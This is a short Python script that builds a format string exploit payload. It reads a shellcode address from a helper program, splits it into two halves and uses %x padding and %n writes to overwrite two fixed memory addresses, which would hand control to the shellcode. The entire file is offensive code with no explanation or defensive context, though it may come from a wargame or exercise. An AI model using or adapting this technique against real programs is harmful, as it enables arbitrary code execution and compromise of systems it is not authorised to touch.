import os
from struct import *

p = lambda x : pack("<L", x)

f = os.popen("./getSC", "r")

SC_Address = list(f.read())
High_Value = int("".join(SC_Address[0:6]), 16)
Low_Value = int("0x"+"".join(SC_Address[6:10]), 16)
Low_Address = 0x08049598
High_Address = 0x0804959a

payload = ""
payload += "AAAA"+p(Low_Address)+"BBBB"+p(High_Address)

Before_Print = len(payload)+24 #24 == 8+8+8 (%8x%8x%8x)
payload += "%8x%8x%8x"

payload += "%"+str(Low_Value-Before_Print)+"c" + "%n"


if Low_Value <= High_Value:
    High_Value = High_Value-Low_Value
else:
    High_Value = int("0x1bfff", 16)-Low_Value


payload += "%"+str(High_Value)+"c" + "%n"